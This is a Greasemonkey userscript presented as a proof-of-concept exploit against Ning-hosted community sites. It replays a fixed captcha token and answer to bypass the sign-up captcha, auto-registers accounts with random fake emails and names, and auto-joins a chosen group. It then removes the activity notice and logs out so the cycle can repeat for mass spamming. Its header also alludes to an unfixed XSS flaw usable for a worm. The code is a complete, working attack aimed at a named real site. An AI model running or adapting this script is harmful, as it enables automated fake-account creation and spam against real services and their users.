// ==UserScript==
// @name		 Defeating Ning Captcha Bypass Proof-Of-Concept 
// @namespace		 http://yehg.net
// @author		 Aung Khant, http://yehg.net
// @description 	 Ning might have over-confidence or doesn't care about Security of its users. This little Greasemonkey Exploit will auto-register and join particular group for massive spamming. My suggested countermeasure is to use 1 time token and challenge-back emailing. Nobody, especially non-security geeks, can realize the ACTUAL attack scene till we, securiy guys, show them small simulation. The following script is targetting on my Country IT Professional Group http://mmitpros.ning.com. Note that you, ning owners, should respect my disclosure policy. Attackers can even make more devastating effects and create biggest Ajax worm using existing still-unfixed variable Charset-encoding XSS on ning.
// @thankz		 Special thanks to authors of XSS Attacks & Exploits who said "Today there are still a few who employ the Power Of JavaScript.". I take such wise advice for granted.  
// @include     	 http://myanmaritpros.com/  
// ==/UserScript==


// Define variables
var url = window.location+"";

var ning_site = "http://myanmaritpros.com/";
var ning_site_signup = "http://myanmaritpros.com/main/authorization/signUp?target=http%3A%2F%2Fmyanmaritpros.com%2F";

var ning_site_signup_final = 
"http://myanmaritpros.com/main/authorization/newProfile?target=http%3A%2F%2Fmyanmaritpros.com%2F&newNingUser=1";

var my_group_url = "http://myanmaritpros.com/group/YangonEthicalH4ck3rs";
var reg_user_prefix = "mmhacker_";
var reg_user_full_name = "The_Burmese_Hacker_Z00b13_";

var profile_url = "http://myanmaritpros.com/profile/";
var signIn_url = "http://mmitpros.ning.com/main/authorization/signIn";
var signOut_url = "http://myanmaritpros.com/main/authorization/signOut?target="+encodeURIComponent(ning_site_signup);



/******** [HELPER FUNCTIONS] ********/
function randomString() 
{
    //@credit: http://www.mediacollege.com/internet/javascript/number/random.html
	var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
	var string_length = 8;
	var randomstring = "";
	for (var i=0; i<string_length; i++) 
	{
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}
	return randomstring;
}

/******** [/HELPER FUNCTIONS] ********/


/******** [FIRST FORM] ********/
function fill_firstLoginInfo()
{
  
   document.getElementById("signup_email").value = reg_user_prefix + randomString()  + "@gmail.com";
   document.getElementById("signup_password").value = "123456789";
   document.getElementById("signup_password_confirm").value = "123456789";   
   document.getElementById("signup_captcha").value = "A34Ty"; 
   
}

function reset_captcha()
{
    // img where class is verification
	var img =  document.getElementsByTagName("img");
	if (img.length >= 1)
	{
		for(var i=0;i<=img.length-1;i++)
		{
		   if (document.getElementsByTagName("img")[i].class=="verification")
		   {
		       document.getElementsByTagName("img")[i].src ="http://www.ning.com/captcha?token=7p5hqS4Bxih8bmzBw6RIUjCefSmoJeuVMGLSy0rtFcIJEh7X1uAfTA__"; 
		   }
		}
	}
    // input=hidden where name is captchaToken
	var input =  document.getElementsByTagName("input");
	if (input.length >= 1)
	{
		for(var i=0;i<=input.length-1;i++)
		{
		   if (document.getElementsByTagName("input")[i].type=="hidden" && document.getElementsByTagName("input")[i].name=="captchaToken")
		   {
		       document.getElementsByTagName("input")[i].value ="7p5hqS4Bxih8bmzBw6RIUjCefSmoJeuVMGLSy0rtFcIJEh7X1uAfTA__"; 
		   }
			
			
		}
	}	
	
}
function do_first_singup()
{ 
   reset_captcha();
   fill_firstLoginInfo();
   document.forms[0].submit();;
   
}
/******** [/FIRST FORM] ********/

/******** [SECOND FORM] ********/

function do_second_singup()
{ 
   document.getElementById("fullname").value = reg_user_full_name + randomString();
   document.getElementById("question_30").value = "`";
   document.getElementById("question_31").value = "`";
   document.getElementById("question_32").value = "`";
   document.forms[0].submit();
}

/******** [/SECOND FORM] ********/

/******** [JOIN GROUP] ********/
//@important:
/* As soon as Second Form Actions are done, 
   Do JOIN GROUP Action 
   Remove Activity Msg
   Do Log Out */
function go_group()
{
	if (url.indexOf(profile_url)>=0)
	{
		window.location = my_group_url;
	}
	if (url == my_group_url)
	{
	   //alert("Exploit Done!\nJoin Group!");
	   //setTimeout("window.location='/';",7000);
	   join_group();
	}
	if (url==ning_site)
	{
	    tremovex();
		setTimeout("window.location='" + signOut_url +"';",30000);
	}
	if (url.indexOf(signIn_url)>=0)
	{
		setTimeout("window.location='" + ning_site_signup +"';",1000);
	}
}  

function join_group()
{
	var a =  document.getElementsByTagName("a");
	if (a.length >= 1)
	{
		for(var i=0;i<=a.length-1;i++)
		{
			if(document.getElementsByTagName("a")[i].innerHTML.indexOf("Join")>=0)
			{
				var fireOnThis = document.getElementsByTagName("a")[i];
				var evObj = document.createEvent('MouseEvents');
				evObj.initMouseEvent( 'click', true, true, window, 1, 12, 345, 7, 220, false, false, true, false, 0, null );
				fireOnThis.dispatchEvent(evObj);	
			}
		}
	}	
}


function tremovex()
{
	setTimeout("removex()",3000);
}

unsafeWindow.removex = function()
{
	var a =  document.getElementsByTagName("a");
	if (a.length >= 1)
	{
		for(var i=0;i<=a.length-1;i++)
		{
			if(document.getElementsByTagName("a")[i].href.indexOf("remove")>=0 || document.getElementsByTagName("a")[i].title.indexOf("Remove")>=0)
			{
				alert("Remove");
				var fireOnThis = document.getElementsByTagName("a")[i];
				var evObj = document.createEvent('MouseEvents');
				evObj.initMouseEvent( 'click', true, true, window, 1, 12, 345, 7, 220, false, false, true, false, 0, null );
				fireOnThis.dispatchEvent(evObj);	
			}
		}
	}
}

/******** [/JOIN GROUP] ********/


/******** [MAIN FUNCTIONS] ********/


function check_ning_signup_page()
{
  if (url==ning_site_signup)
  { 
     // alert("This is your desired ning site.\nI'm ready to exploit!");
      do_first_singup();
	  return true;	  
  }
  else {return false;}
}

function check_ning_signup_final_page()
{
	if (document.getElementById("fullname") && document.getElementById("question_30") && document.getElementById("question_31") && document.getElementById("question_32"))
	{
		//alert("This is your 2nd signup page. I'm gonna finish it in seconds!");
		do_second_singup();
	}
	
}



function main()
{
	 check_ning_signup_page();
	 check_ning_signup_final_page();
	 go_group();
}
window.addEventListener('load',main,true);

/******** [/MAIN FUNCTIONS] ********/